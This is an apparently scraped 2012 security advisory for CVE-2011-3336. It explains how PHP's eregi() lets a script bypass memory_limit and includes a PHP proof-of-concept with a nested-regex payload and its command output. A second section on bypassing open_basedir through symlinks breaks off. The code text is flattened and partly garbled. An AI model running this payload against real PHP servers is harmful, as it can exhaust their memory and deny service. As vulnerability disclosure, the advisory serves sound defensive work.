{
    "text": "vul_name : PHP 5.4/5.3 deprecated eregi (  ) memory_limit bypass ， vul_cve : CVE-2011-3336 ， vul_poc :  [ PHP 5.4/5.3 memory_limit bypass ]  ， Author : Maksymilian Arciemowicz ， Website :  ， Date : 30.03.2012 ， Original link :  ， PoC's :  ， memory_limit poc ， open_basedir poc ， - 1. PHP memory_limit bypass - ， Functions based on POSIX Regular Expression eg. eregi , are deprecated since PHP 5.3. In last version 5.4.0 we may still use these functions. It allow us to bypass memory_limit in PHP. ， eregi (  ) function based on POSIX regexp , otherwise preg_match (  ) based on PCRE. This is the main difference between these functions. ， POSIX Regex Functions Tutrial ， PCRE Functions Tutrial ， In last year , we have published a fix for regcomp (  ) /libc function from NetBSD source. eregi (  ) use the same source code what in libc of netbsd. In result , we may exhaustion memory limit or stack in PHP ， See our security note :  ， Multiple BSD libc/regcomp ( 3 ) Multiple Vulnerabilities ， Script presented below , show how to use eregi (  ) to exhaustion memory in PHP ， <? ， PHP 5.4 5.3 memory_limit bypass exploit poc ， by Maksymilian Arciemowicz ， cxib [ a.T ] cxsecurity [ d0t ] com ， To show memory_limit in PHP ，  # php /www/memlimpoc.php 1 35000000 ， PHP Fatal error : Allowed memory size of 33554432 bytes exhausted ( tried to allocate 35000001 bytes ) in /var/www/memlimpoc.php on line 12 ， Fatal error : Allowed memory size of 33554432 bytes exhausted ( tried to allocate 35000001 bytes ) in /var/www/memlimpoc.php on line 12 ， and try this ，  # php /www/memlimpoc.php 2 ， memory_limit bypassed ， ini_set ( \"memory_limit\" , \"32M\" )  ;  ，  $ sss=str_repeat ( \"A\" ,  $ argv [ 2 ]  )  ;  ， elseif (  $ argv [ 1 ] =2 )  ， eregi ( \" ( .? )  ( . *  ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2} ) {1 , 2}\" , \"a\" )  ;  ， ?> ， Remember. Don't use memory_limit as a main memory limiter. ， - 2. PHP open_basedir bypass - ， PHP latest version , 5.4.0 brought many changes. safe_mode has been removed but open_basedir is still available for use. We don't need look for new ways to bypass open_basedir. The problem with symlinks is still available in PHP. ， safe_mode tutrial ， PoC :  ， 127 # cat sym.php",
    "time": "2012.03.30"
}